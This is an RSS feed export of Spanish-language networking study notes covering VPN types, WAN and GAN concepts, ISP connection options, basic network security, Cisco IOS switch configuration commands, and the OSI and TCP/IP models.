Site-To-Site VPN: Tanto el cliente como el servidor son dispositivos de la red, habitualmenterouters o firewalls, y comparten el rango de red completo. Esto es muy comúnmente usado para unir redes empresariales a través de internet, lo que permite que varias ubicaciones se comuniquen a través de Internet como si fueran locales.

<br>
Remote Access VPN: Esto implica que la computadora del cliente crea una interfaz virtual que se comporta como si estuviera en la red de un cliente. Por ejemplo, páginas como Hack The Box hacen uso de OpenVPN, que crea un adaptador TUN que permite acceder a los recursos necesarios. Al analizar estas VPN, una pieza importante a considerar es la tabla de enrutamiento que se suele crear al unirse a la VPN. SI la VPN solo crea rutas para redes específicas, esto se denomina VPN de túnel dividido, lo que significa que la conexión a Internet no sale de la VPN.

<br>
SSL VPN: Básicamente, esta VPN se realiza dentro de nuestro navegador y se está volviendo cada vez más común a medida que nlos navegadores web se vuelven capaces de hacer cosas. Normalmente, estas VPNs transmitiran aplicaciones o sesiones de escritorios enteros a nuestro navegador.

<br><br>Una red mundial como Internet es conocida como Global Area Network (GAN). Sin embargo, internet no es la única red informática de este tipo. Las compañias con actividad internacional también mantienen redes aisladas que abarcan varias WAN y conectan equipos de la empresa en todo el mundo. Las GAN utilizan la infraestrucutra de fibra de vidrio de redes de área amplia y las interconectan mediante cables submarinos internacionales o transmisión por satélite.<br><img alt="GAN_example_image.png" src="https://dobliuw.com/lib/media/gan_example_image.png"><br><br>Otros dos términos que son similares al término de "internet" son intranet y extranet.<br>El término intranet se utiliza para referirse a la conexión privada de LAN y WAN que pertenecen a una organización. Una intranet está diseñada para qeu solo puean acceder a ellas los miembros y empleados de la organización, u otras personas autorizadas.<br>Por otro lado, es posible que una organización utilice una extranet para proporcionar acceso seguro a las personas que trabajn para otra organización, pero requiere datos de la empresa. Algunos ejemplos de extranet son:<br>
<br>Una empresa que proporciona acceso a proveedores y contratistas externos.
<br>Un hospital que proporciona un sistema de reservas a los médicos para que puedan hacer citas para sus pacientes.
<br>Una secretaria de educación local que proporciona información sobre presupuesto y personal a las escuales de distrito.
]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/1.-structure/2.-network-structure.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/1. Structure/2. Network structure.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 30 Aug 2024 19:15:32 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/common_network_types.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/common_network_types.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Access Internetwork technologies]]></title><description><![CDATA[ 
 <br><br>Los usuarios domésticos, los trabajadores remotos y las oficinas pequeñas generalmente requieren una conexión a un ISP (Internet Service Provider) para acceder a Internet. Las opciones de conexión varían mucho entre los ISP y las ubicaciones geográficas. Sin embargo las opciones más utilizadas incluyen banda ancha por cable, banda ancha por línea de suscriptor digital (DSL), redes WAN inálambricas y servicios móviles.<br><br><br><br>Algunas de las conexiones comunes brindadas por los ISP para acceder a Internet para usuarios de redes pequeñas son: <br>
<br>
DSL (Digital Suscriptor Line): Las líneas de suscriptor digital proporcionan un gran ancho de banda, alta disponibilidad y una conexión permanente a internet. DSL se transporta por la línea de teléfono. En geenral los usuarios de oficinas en el hogar o pequeñas se conectan mediante una línea de suscriptor digital asimétrica (ADSL), esto implica que la velocidad de descarga es mayor que la velocidad de carga.

<br>
Cable: Típicamente ofrecido por los proveedores de servicios de televisión por cable, la señal de datos de Internet se transmiten en el mismo cable que ofrece la televisión por cable. Proporciona un gran ancho de banda, alta disponibilidad y una conexión a Internet siempre activa.

<br>
Celular: El acceso a internet celular utiliza una red de telefonía celular para conectarse. En cualquier lugar donde tenga cobertura de telefonía móvil, puede tener acceso a Internet. El rendimiento está limitado por las capacidades del teléfono y la torre celular a la que está conectado.

<br>
Satelital: La disponibilidad de acceso a Internet satelital es un beneficio en aquelas áreas que de otra manera no tendrían conectividad a Internet. as antenas parabóicas requieren una ínea de vista despejada a satéite.

<br>
Teefonía por Dial-up: Es una oción de bajo costo que funciona con cualquier línea telefónica y un módem. El ancho de banda que proporciona una conexión por módem, conexión por dial-up es abjo y, por lo general, no es suficiente para transferencia de datos masivas, si bien es útil para acceso móvil durante viajes.

<br><img alt="domestic_connections_to_internet.png" src="https://dobliuw.com/lib/media/domestic_connections_to_internet.png"><br><br>Las opcoines de conexión corporativas difieren de las opciones que tienen los usuarios domésticos. Es posible que las empresas requieran un ancho de banda mayor y dedicado, además de servicios administrados. Las opciones de conexión disponibles varían según el tipo de proveedores de servicios que haya en las cercanías. <br>Algunas de las conexiones comunes brindadas por los ISP para conectarse a Internet para usuarios de redes empresariales son:<br>
<br>
Líneas arrendadas dedicadas: Las líneas arrendadas son circuitos reservados dentro de la red del proveedor de servicios que conectan oficinas separadas geográficamente para redes privadas de voz y/o datos. Los circuitos se alquilan a una tasa mensual o anual.

<br>
Metro Ethernet: Esto a veces se conoce como Ethernet WAN. Metro Ethernet exitenden la tecnología de acceso LAN a la WAN. Ethernet es una tecnología LAN que se puede puede encontrar referenciada en [[]]. 

<br>
DSL Empresarial (Digital Suscriptor Line): El servicios de DSL empresarial está disponible en diversos formatos. Una opción muy utilizada es la línea de suscriptor digital simétrica (SDSL), que es similar a la v ersión de DSL para el consumidor, per proporciona las mismas velocidades de subida y descarga.

<br>
Satelital: El servicio satelital puede proporcionar una conexión cuando una solución por cable no está disponible. 

<br><br><br>Una red de confianza es un entorno de red en el que lso dispositivos, usuarios y servicios están predefinidos como seguros o confiables. Dentro de una red confiable, los sistemas y usuarios podrán interactuar con menos restricciones de seguridad que en una red no confiable o pública. Esta confianza se basa en la suposición de que lso elementos dentro de la red han sido verificados o cumplen con ciertos criterios de seguridad, manejo de errores y posibles congestiones.<br><br>Una red tolerante a fallas es aquella que limita la cantidad de dispositivos afectados durante una falla. Está construido para permitir una recuperación rápida cunado se produce una falla de este tipo. Estas redes dependen de varias rutas entre el origen y el destino del mensaje. Si falla una ruta, se pueden enviar inmediatamente por otro enlace. El hecho de que haya varias rutas que conducen a un destino se denomina redundancia.<br><img alt="redundancia_fallas_network.png" src="https://dobliuw.com/lib/media/redundancia_fallas_network.png"><br><br>Una red escalable se expande rápidamente para admitir nuevos usuaris y aplicaciones. Esto se hace din segradar el redimineto de los servicios a los que están accediendo los usuarios existentes. En la siguiente imagen veremos cómo se pueden agregar redes nuevas a redes existentes con facilidad. Además de esto, las redes son escalables porque los diseñadores siguen los estándares y protocolos aceptados. Esto permite a los proveedores de software y hardware centrarse en mejorar los productos y servicios in tener que diseñar un nuevo conjunto de reglas para operar dentro de la red.<br><img alt="Network_scalability.png" src="https://dobliuw.com/lib/media/network_scalability.png"><br><br>La calidad de servicio (QoS) es un requisito cada vez más importante para las redes hoy en día. Las nuevas aplicaciones disponibles para los usuarios en internetworks, como las transmisiones de voz y de vídeo en vivo generan expectativas más altas sobre la calidad de los servicios que se proporcionan. Por ejemplo, muchas veces nos a pasado de intentar mirar un video con interrupciones y pausas constantes.... a  medida que el contenido de datos, voz y vídeo sigue convergiendo en la misma red, QoS se convierte en un mecanismo principal para administrar la congestión y garantizar el envió confiable de contenido de todos los usuarios.<br>La congestion se produce cuando la demanda de ancho de banda excede a la cantidad disponible. El ancho de banda de la red es la medida de la cantidad de bits que se pueden transmitir en un segundo, es decir, bits por segundo (bts). Cuando se producen intento de comunicaciones simultáneas a través de la red, la demanda de ancho de banda puede exceder su disponibilidad, lo que provoca congestión en la red.<br>Cuando el volumne de tráfico es mayor de lo que se puede transportar en la red, los dispositivos colocan los apquetes en cola en la memoria hasta que haya recursos disponibles para transmitirlos. En la siguiente imagen, veremos el ejemplo de que un usuario solicita una página web y otro está realizando una llamda telefónica. Con una política de QoS, el router puede administrar el flujo de datos y el tráfico de voz, dando prioridad a las comuinicaciones de voz si la red se congestiona.<br><img alt="QoS_networking_example_image.png" src="https://dobliuw.com/lib/media/qos_networking_example_image.png"><br><br>La infraestructura de red, los servicios y los datos contenidos en los dispositivos conectados a la red son activos comerciales y personales muy importantes. Los adminsitradores de red deben abordar dos tipos de problemas de seguridad de red: seguridad de la infraestructura de red y seguridad de la información. <br>Asegurar la infraestructura de red incluye aseguridad físicamente los dispositivos que proporcionan conectividad de red y evitar el acceso no autorizado al software de administración que reside en ellos, como se muestra en la siguiente imagen: <br><img alt="security_network_image_example.png" src="https://dobliuw.com/lib/media/security_network_image_example.png"><br>A su vez, los administradores de red también deben proteger la información contenida en los apaquetes que se tranmsiten a través de la red y la información almacenada en los dispostivos conectados a la red. Para alcanzar lso objetivos de seguridad de la red, hay tres requisitos principales.<br>
<br>Confidencialidad: La confidencialidad de los adtos se refiera a que solamente los destinatarios deseados y atorizados puedan acceder a los datos y leerlos.
<br>Integridad: La integridad de los datos, habla de tener la seguridad de que la información no se ve alterada en la transmisión, del origen al destino.
<br>Disponibilidad: Significa tener la seguridad de acceder en forma confiabel y oportuna a los servicios de datos para usuarios autorizados al momento que así querramos.
<br><br> La seguridad de la red es una parte integral de la red informática, independientemente de si la red está en un hogar con una sola conexión a Internet o es una empresa con miles de usuarios. La seguridad de la red debe tener en cuenta el entorno, así como las herramientas y requisitos de la red. Debe ser capaz de proteger los datos al tiempo que permite la calidad de servicio que los usuarios esperan en la red.<br>Asegurar una red implica protocolos, tecnologías, dispositivos, herramientas y técnicas para proteger los datos y mitigar las amenazas. Los vectores de amenazas pueden ser externos o internos. Muchas amenzas de seguridad de redes externsas se originan hoy en Internet.<br>Algunas de las amenazas comunes externas a las redes son virus, worms, trojans, spyware, adware, cero days, DoS/DDoS, robo de identidad, etc.<br>Adicionalmente, tener en cuenta las amenazas internas es muy importante. Las violaciones de datos más comunes suceden a causa de los usuarios internos de la red. Esto se puede atribuir a dispositivos perdidos o robados o al mal uso accidental por parte de los empleados, y dentro del entorno comercial, incluso a empleados maliciosos.<br><img alt="network_security_threats_image_example.png" src="https://dobliuw.com/lib/media/network_security_threats_image_example.png"><br>Si bien no hay una solución única que pueda proteger una red contra la variedad de amenazas que existen, es importante aplicar varias capas de seguridad, así como también debe utilizarse más de una solución de seguridad. Si un componente de seguridad no puede identificar y proteger la red, otros pueden tener éxito.<br>Por lo general, la implementación de seguridad de las redes domésticas es muy básica. Suelen implementarse en los endpoints, así como en el punto de conexión a Internet, e incluso puede confiar en los servicios contratados por el ISP.<br>
<br>Antivirus: Estas aplicaciones pueden ayudar a protoger los dispositivos finales para que nos e infecten con software malicioso.
<br>Firewall: El filtrado de firewall bloque el acceso no autorizado dentro y fuera de la red. Esto puede incluir un sistema de firewall ejecutadoen un host que se implemente para impedir el acceso no autorizado al terminal o un servicio de filtrado básico en el router doméstico par impedir el acceso no autorizado del mundo exterior de la red.
<br>Por otro lado, la implementación de seguridad de la red en redes de las empresas normalmente consiste en la integración de numerosos componentes a la red para controlar y filtrar el tráfico. La idea es que todos estos componentes funcionen juntos, lo que minimiza la necesidad de mantenimiento y aumenta la seguridad.<br>
<br>Sistemas de firewall dedicado: Estos proporcionan capacidadesde firewall más avanzadas que pueden filtrar grandes cantidades de tráfico con más granularidad.
<br>Listas de control de acceso (ACL): Estos filtran aún más el acceso y el reenvío de tráfico en función de las direcciones IP y las aplicaciones.
<br>Sistemas de prevención de intrusiones (IPS): Estos identifican amenzasa de rápida propagación, como 0 days.
<br>Redes Privadas Virtuales (VPN): Estos proporcionan acceso seguro a una organización para trabajadores remoto.
<br><img alt="security_solutions_network_image_example.png" src="https://dobliuw.com/lib/media/security_solutions_network_image_example.png">]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/1.-structure/3.-internetwork-conections-&amp;-trusted-networks.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/1. Structure/3. Internetwork conections &amp; trusted networks.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 04 Sep 2024 18:28:04 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/domestic_connections_to_internet.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/domestic_connections_to_internet.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Cisco IOS]]></title><description><![CDATA[ 
 <br><br>Los sistemas operativos de red son similares al sistema operativo de una PC. Mediante una GUI (Grafical User Interface), un sistema operativo permite que el usuario realice acciones básicas como utilizar el mouse para hacer selecciones y ejecución de programas, introducir textos y comandos, así como ver los resultados en el monitor.<br>Pero como sabemos, todos los sitemas operativos estan basados en la CLI (Command Line Interface), el sistema operativo de dispositivos intermedios de Cisco no son la excepción. El Cisco IOS en un swtich o router, permite que un técnico de red realice lo siguiente:<br>
<br>Ejecución de programas de red basados en la CLI.
<br>Introducción de comandos basados en texto.
<br>Ver resultados en el monitor.
<br>Los dispositivos de red de Cisco ejecutan versiones epeciales de Cisco IOS. La versión de IOS dependerá del tipo de dispositivo que se utilizará y de las características necesarias. Si bien todos los dispositivos traeran un IOS y un conjutno de características predeterminados, es posible actualizar el conjunto de estas o la versión de IOS para obtener capacidades adicionales.<br><br><br>Los métodos de acceso a una consola de un dispositivo intermedio como un Switch o un Router es mediante una de las siguientes opciones:<br>
<br>
Terminal: Este es un puerto de administración físico que proporciona acceso fuera de banda a un dispositivo de Cisco. El acceso fuera de banda hace referencia al acceso por un canal de adminitración exclusivo que se usa únicamente con fines de mantenimiento del dispositivo. La ventaja de usar este tipo de conexión, mediante un cable que conecta al puerto de consola del dispositivo, es que el mismo será accesible incluso no hayan configurados servicios de redes.

<br>
Secure Shell (SSH): Otro método para disponer de una terminal del dispositivo, es decir, establecer una sesión de CLI de manera remota a través de una interfaz virtual, es hacer uso del protocolo SSH el cual nos brindará de manera remota una conexión al dispositivo el cual podremos manejar con una términal, siendo todo el tráfico de red utilizado por este, cifrado.

<br>
Telnet: Otro método, pero esta vez inseguro, para establecer una sesión de CLI de manera remota a través de una interfaz virtual por medio de una red, es hacer uso del protocolo Telnet. A diferencia de SSH, telnet no proporciona una conexión segura ya que todo el tráfico de red viaja en ASCII (Texto plano), sin sufrir ningún tipo de cifrado para evitar snifeos de conexión.

<br>Adicionalmente, algunos de estos dispositivos intermedios, como los routers, pueden admitir un puerto heredado auxililar utilizado para establecer una sesión CLI de forma remota a través de una conexión telegónica utilizando un módem.<br><br><br>Al igual que muchos sistemas operativos, Cisco IOS tiene su propio modo de uso, comandos y niveles de privilegio. Como característica de seguridad, el software de IOS de Cisco divide el acceso de administración en dos modos de comando:<br>
<br>
Command exection mode (Modo de ejecución de comando): Este modo de ejecución tiene las capacidades limitadas per resulta útil en el caso de alguna operación básica. Permite solo una cantidad limitada de comadnos de monitoreo básicos, per no permite la ejecución de ningún comando que podría cambiar la configuración del dispositivo. El modo EXEC del usuario se puede reconocer con la aparición del carácter '&gt;' en el prompt.

<br>
Privileged execution mode (Modo de ejecución privilegiado): Este modo de ejecución permite ejecutar comandos de configuración más todos los comandos posibles a ejecutar en el modo EXEC del usuario. Un administrador de redes debe acceder al modo EXEC con privilegios (O también llamado modo enable). Solo se puede ingresar al modo de configuración global y a los mmodos de configuración más altos por medio de este modo. El modo EXEC con privilegios se puede reconocer por la aparición del carácter '#' en el prompt.

<br>
Cambiar al modo EXEC privilegiado con el comando enable:

<br>Switch&gt; enable
Switch#
Copy<br>
<br>Cambiar al modo EXEC de usuario con el comando disable:
<br>Switch# disable
Switch&gt;
Copy<br>Con el comando ? obtendremos un uso similar al del comando help, podremos ver opciones de comandos, comandos, ayuda de uso de un comando, etc. <br><br><br>Para configurar el dispositivo intermedio, el usuario debe ingresar al modo de configuración global, que normalmente se denomina modo de config. <br>Desde el modo de configuración global, se realizan cambios en la configuración de la CLI qeu afectan la operación del dispositivo en su totalidad. El modod de configración global se identifica mediante un mensaje que termina con el apartado (config)# despues del hostname del dispositivo.<br>Antes de acceder a otros modos de configuración específicos, se accede al modo de configuración global. Desde este modo, el usuario puede recien ingresar a diferentes modos de subconfiguración. Cada uno de estos submodos permiten la configuración de una parte o función específica del dispositivo. Por ejemplo, dos modos de subconfiguración incluyen los siguientes:<br>
<br>
Line mode configuration: Se utiliza para configurar la consola, SSH, Telnet o acceso auxiliar. (Identificado con (config-line)# luego del hostname).

<br>
Interface mode configuration: Se utiliza para configurar un puerto de swtich o una interfaz de red de router. (Identificado con (config-if)# luego del hostname).

<br>
Entrar al modo de configuración global con el comandoconfigure terminal:

<br>Switch# configure terminal
Switch(config)#
Copy<br>Para pasar de cualquier modo de subconfiguración a un modo anterior, podremos hacer uso del comando exit.<br>
Para salir de todos los niveles de subconfiguración y retornar al modo EXEC privilegiad, podremos hacer uso del comando end o de la pulsación de teclas Ctrl + z.<br>
<br>Entrar al modo de subconfiguración de línea con el comando line {type_line} {number}:
<br>Switch(config)# line console 0
Switch(config-line)#
Copy<br>
<br>Entrar al modo de subconfiguración de interfaces con el comando interface {type_interface} {number}:
<br>Switch(config)# interface FastEthernet 0/1
Switch(config-if)#
Copy<br>Es importante saber que podemos trasladarnos directamente de un modo de subconfiguración a otro y no es necesario retornar al modo de configuración global.<br><br><br>Una de las primeras configuraciones que llevamos a cabo a la hora de comenzar a configurar un dispositivo es darle el nombre de host con el comando hostname:<br>Switch# configure terminal
Switch(config)# hostname Sw-Dobliuw
Sw-Dobliuw(config)#
Copy<br>Por otro lado, como sabemos, el uso de contraseñas para proteger los distintos modos EXEC son fundamentales, para esto usaremos distintos comandos como password {password} y login para habilitar el acceso EXEC de usuario con el comando:<br>Sw-Dobliuw# configure terminal
Sw-Dobliuw(config)# line console 0
Sw-Dobliuw(config-line)# password dobliuw123
Sw-Dobliuw(config-line)# login
Sw-Dobliuw(config-line)# end
Sw-Dobliuw#
Copy<br>Una vez ejecutado estos comandos, el acceso a la consola requerirá una contraseña antes de permitir el acceso. Estos comandos pueden ser llevados a cabo con VTY es pecificas, por ejemplo, para configurar las 16 VTYs posibles en un dispositivo intermedio, podriamos utilizar los comandos:<br>Sw-Dobliuw# configure terminal
Sw-Dobliuw(config)# line vty 0 15
Sw-Dobliuw(config-line)# password dobliuwvty123
Sw-Dobliuw(config-line)# login
Sw-Dobliuw(config-line)# {Ctrl + Z}
Sw-Dobliuw#
Copy<br>Por otro lado, para proteger con credenciales el acceso EXEC privilegiado utilizaremos el comando enable secret {password}:<br>Sw-Dobliuw# configure terminal
Sw-Dobliuw(config)# enable secret 123dobliuw
Sw-Dobliuw(config)# exit
Sw-Dobliuw#
Copy<br>Ahora bien.... todas estas configuraciones llevadas a cabo, se almacenarán en diferentes archivos los cuales son:<br>
<br>startup-config: Este es el archivo de configuración guardado que se almacenará en NVRAM. Contiene todos los comandos que usará el dispositivo al iniciar o reinciar. Flash no pierde su contenido cuando el dispositivo está apagado.
<br>running-config: Este archivo se almacena en la memoria de acceso aleatorio (RAM) del dispositivo. Refleja la configuración actual. La modificación de una configuración en ejecución afecta el funcionamiento del dispositivo Cisco de inmediato. La memoria RAM es volátil, lo que indic que se perderá todo el cotenido cuando el dispositivo se apague o reinicie.
<br>En estos archivos de configuracion podremos encontrar las credenciales utilizadas a la hora de las distintas configuraciones de seguridad tanto para el modo EXEC de usuario como para el modo EXEC privilegiado, por lo cual como deducimos, esto es una amenaza de seguridad porque cualquier que logre acceder a estos archivos obtendría las credenciales utilizadas en texto plano.<br>Sw-Dobliuw# show running-config
......
!
(Output omitted)
!
line con 0
password dobliuw123
login
!
.....
Copy<br>Para solucionar esto y encriptar todas las contraseñas almacenadas en ASCII, utilizaremos el comando service password-encryption en modo de configuración global:<br>Sw-Dobliuw# configure terminal
Sw-Dobliuw(config)# service password-encryption
Sw-Dobliuw(config)# exit
Sw-Dobliuw# show running-config
......
!
(Output omitted)
!
line con 0
 password 5 $l$mERr$LE36kP4e/aQWqlFEGOSh60
 login
!
.....
Copy<br>Adicionalmente podremos configurar el banner de aviso que podremos utilizar para mantener al personal no autorizado fuera de la red, o al menos intentar, dado que esto es uan parte importante en los procesos legales en el caso de una demanda por acceso no autorizado a un dispositivo. Es fundamental que haya un mensaje que advierta del acceso no autorizado para evitar una posible defensa exitosa dado que el dispositivo "no indicaba que el acceso para personal no autorizado no estaba permitido".<br>Esto lo haremos con el comando banner motd:<br>Sw-Dobliuw# configure terminal
Sw-Dobliuw(config)# banner motd #Authorized personal access only!#
Copy<br>De esta manera, a la hora de querer iniciar sesión veremos el siguiente mensaje:<br>Press RETURN to get started.




Authorized personal access only!

User Access Verification

Password:
Copy<br>Como mencionamos anteriormente, existen dos archivos de configuración, startup-config que almacena la configuración en NVRAM y running-config que almacena la configuración en RAM. <br>Si los cambios realizados en la configuración en ejecución no tienen el efecto que buscamos y la ocnfiguración en ejecución aún no se ha guardado, podemos restaurar el dispositivo a su configuración anterior. Podríamos eliminar los comandos modificados individualmente o volver a cargar el dispositivo con el comando reload en modo enable mode para restaurar el startup-config.<br>La desventaja de usar este comando para eliminar una configuración en ejecución no guardada es la breve cantidad de tiempo que el dispositivo estará fuera de línea, causando un periodo de inactividad en la red.<br>Por otro lado, si los cambios no deseados se guardaron en la configuración de inicio (startup-config), puede ser necesario borrar todas las configuraciones. Esto requiere borrar la configuración de inicio y reinicar el dispositivo. La configuración de inicio se elimina mediante el comando erase startup-config estand en enamble mode.<br>Finalmente, para guardar la configuración actual (running-config) de manera permanente (startup-config) haremos uso del comando copy running-config startup-config. <br><br><br>Para acceder al switch de manera remota, se deben configurar una dirección IP y una máscara de subred en la SVI (Switch Virtual Interface). Para configurar una SVI en una switch, utilice el comando interface vlan 1 configuración global. La VLAN 1 no es una interfaz física real, sino una virtual. A continuación, agregaremos una dirección IPv4 mediante el comando ip address {ip_address} {subnet_mask} de la configuración de interfaz. Finalmente, habilitaremos la interfaz virtual utilizando el comando no shutdown.<br>Sw-Dobliuw# configure terminal
Sw-Dobliuw(config)# interface vlan 1
Sw-Dobliuw(config-if)# ip address 192.168.1.2 255.255.255.0
Sw-Dobliuw(config-if)# no shutdown
Sw-Dobliuw(config-if)# exit
Sw-Dobliuw(config)# ip default-gateway 192.168.1.1
Copy<br>Una vez ejecutado estos comandos, el switch dispondrá de todos los elementos IPv4 para llevar a cabo la comunicación a través de la red. Para visualizar las configuraciones de direcciones IP podremos hacer uso del comando show ip interface brief:<br>Sw-Dobliuw# show ip interface brief
Interface            IP-Address             OK? Method Status                 Protocol
FastEthernet0/1      unnasigned             YES manual down                   down
.................
.................
Vlan1                192.168.1.2            YES manual up                     down
Copy]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/2.-switches-&amp;-cli-configuration/0.-cisco-devices-and-configuration.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/2. Switches &amp; CLI configuration/0. Cisco devices and configuration.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 05 Sep 2024 19:00:43 GMT</pubDate></item><item><title><![CDATA[Command IOS syntax]]></title><description><![CDATA[ 
 <br><br><br><br><br><br>Adicionalmente, cuando vemos que el output es - - More - -, estaremos viendo un Stdout en modo páginado, con lo cual será útil tener en mente las siguientes teclas:<br><br><br><br>]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/2.-switches-&amp;-cli-configuration/cisco-ios-hot-keys-&amp;-shortcuts.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/2. Switches &amp; CLI configuration/Cisco IOS Hot keys &amp; Shortcuts.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 05 Sep 2024 15:03:50 GMT</pubDate></item><item><title><![CDATA[The OSI Model / El modelo OSI]]></title><description><![CDATA[ 
 <br><br>El Modelo OSI es un modelo teórico de referencia que describe cómo los sistemas de red deberían comunicarse entre sí. Este está compuesto por siete (7) capas que permiten la estandarización de funciones de red específicas<br><br><img alt="OSI_TCP_IP_LAYERS 1.png" src="https://dobliuw.com/lib/media/osi_tcp_ip_layers-1.png"><br>Para dejar un poco más claro, las capas de 2 a 4 están orientadas al transporte y desde las capas 5 a 7 están orientadas a la aplicación. En cada capa se realizan tareas definidas con precisión y se describen con precisión las interfaces con las capas vecinas. cada capa ofrece servicios para su uso en la capa directamente encima de ella. Para que estos servicios estén disponibles, la capa utiliza los servicios de la capa inferior y realiza las tareas de su capa.<br>Si dos sistemas se comunican, las siete capas del modelo OSI se ejecuta al menos dos veces, ya que tanto el emisor como el receptor deben tener en cuenta el modelo de capas. Por lo tanto, se debe realizar una gran cantidad de tareas diferentes en las capas individuales para garantizar la seguridad, confiabilidad y rendimiento de la comunicación.<br>Cuando una aplicación envía un paquete a otro sistema, el sistema trabaja con las capas que se muestran arriba desde la capa 7 hasta la capa 1, y el sistema receptor descomprime el paquete recibido desde la capa 1 hasta la capa 7. Podríamos entender esto viendo el ejemplo visual de <a data-href="osimodel_example.excalidraw" href="https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/osi-model/osimodel_example.excalidraw.html" class="internal-link" target="_self" rel="noopener nofollow">osimodel_example.excalidraw</a> donde podemos apreciar este flujo de datos.<br>También podemos ver <a data-tooltip-position="top" aria-label="https://www.youtube.com/watch?v=CnNRdJgeMo8" rel="noopener nofollow" class="external-link" href="https://www.youtube.com/watch?v=CnNRdJgeMo8" target="_blank">explicaciones del modelo OSI</a> para entender aún mejor esto.]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/osi-model/osi-model.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/3. Protocols/3.0 Models/OSI Model/OSI Model.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 20 Sep 2024 13:27:11 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/osi_tcp_ip_layers-1.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/osi_tcp_ip_layers-1.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[OSI Model]]></title><description><![CDATA[ 
 
  
  
  
    
  
  OSI Model7. Application                    FPT, HTTP6. Presentation        PNG, PNG, SSL, TXT5. Session                          NetBIOS4. Transport                      TCP, UDP2. Data-Link                  Switch, Bridge1. Physical                     Network Card3. Network                Router, L3 SwitchHosts LayersMedia Layers]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/osi-model/osi-model.excalidraw.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/3. Protocols/3.0 Models/OSI Model/OSI Model.excalidraw.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 09 Jan 2024 20:17:57 GMT</pubDate></item><item><title><![CDATA[osimodel_example]]></title><description><![CDATA[ 
 
  
  
  
    
  
  INTERNETINTERNETDobliuw PC94.140.11.20831.13.67.52Dobliuw PC94.140.11.20831.13.67.52Domain Name Server       (DNS)Domain Name Server       (DNS)183.45.28.4Boss PhoneWhatsapp Server183.45.28.4Boss PhoneWhatsapp Server3. NETWORK2. DATA LINK1. PHYSIC3. NETWORK2. DATA LINK1. PHYSIC7. APPLICATION6. PRESENTATION5. SESSION4. TRANSMITION3. NETWORK2. DATA LINK1. PHYSIC7. APPLICATION6. PRESENTATION5. SESSION4. TRANSMITION3. NETWORK2. DATA LINK1. PHYSIC7. APPLICATION6. PRESENTATION5. SESSION4. TRANSMITION3. NETWORK2. DATA LINK1. PHYSIC7. APPLICATION6. PRESENTATION5. SESSION4. TRANSMITION3. NETWORK2. DATA LINK1. PHYSIC7-11-7DatosDatosDatosSegmentosPaquetesBitsTramasDatosDatosDatosSegmentosPaquetesBitsTramas]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/osi-model/osimodel_example.excalidraw.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/3. Protocols/3.0 Models/OSI Model/osimodel_example.excalidraw.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 16 Jan 2024 18:06:47 GMT</pubDate></item><item><title><![CDATA[TCP-IP Model]]></title><description><![CDATA[ 
 
  
  
  
    
  
  Hosts LayersMedia LayersTCP/IP Model4. Application2. Internet1. Link3. Transport]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/tcp-ip-model/tcp-ip-model.excalidraw.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/3. Protocols/3.0 Models/TCP-IP Model/TCP-IP Model.excalidraw.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 09 Jan 2024 20:24:44 GMT</pubDate></item><item><title><![CDATA[TCP/IP Model]]></title><description><![CDATA[ 
 <br><br>El modelo TCP/IP también es un modelo de referencia en capas, a menudo denominado Internet Protocol Suite. La diferencia de este con el <a data-href="OSI Model" href="https://dobliuw.com/notes/2.-networks/network-basics/3.-protocols/3.0-models/osi-model/osi-model.html" class="internal-link" target="_self" rel="noopener nofollow">OSI Model</a> es que TCP/IP es un modelo más práctico y usado en la vida real, mientras que el modelo OSI es un modelo más didáctico y de referencia.<br>Similar al Modelo OSI, el modelo TCP/IP se divide en capas, solamente que en este caso contamos con cuatro (4). Algunas de estas capas (Application y Link) fucionan más de una capa del modelo OSI.<br><br>Con TCP/IP, cada aplicación puede transferir e intercambiar datos a través de cualquier red, y no importa dónde esté ubicado el receptor. IP garantiza que el paquete de datos llegue a su destino y TCP controla la transferencia de datos y garantiza la conexión entre el flujo de datos y la aplicación. La principal diferencia entre TCP/IP y OSI es la cantidad de capas, algunas de las cuales se han combinado.<br><img alt="OSI_TCP_IP_LAYERS 1.png" src="https://dobliuw.com/lib/media/osi_tcp_ip_layers-1.png"><br>Las tareas más importantes del modelo TCP/IP son:<br>
